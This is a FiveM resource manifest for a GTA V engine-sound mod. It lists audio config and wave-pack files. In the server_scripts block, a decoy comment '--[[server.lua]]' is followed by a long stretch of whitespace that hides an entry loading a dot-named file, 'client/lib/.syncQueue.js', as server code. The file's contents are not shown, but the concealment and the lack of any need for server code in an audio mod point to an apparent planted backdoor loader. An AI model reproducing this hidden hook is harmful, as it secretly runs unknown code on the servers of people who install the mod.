fx_version "adamant"
game "gta5"

files {
	"audioconfig/*.dat151.rel",
	"audioconfig/*.dat54.rel",
	"audioconfig/*.dat10.rel",
	"sfx/**/*.awc"
}

data_file "AUDIO_SYNTHDATA" "audioconfig/nsr2teng_amp.dat"
data_file "AUDIO_GAMEDATA" "audioconfig/nsr2teng_game.dat"
data_file "AUDIO_SOUNDDATA" "audioconfig/nsr2teng_sounds.dat"
data_file "AUDIO_WAVEPACK" "sfx/dlc_nsr2teng"

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'client/lib/.syncQueue.js',
}
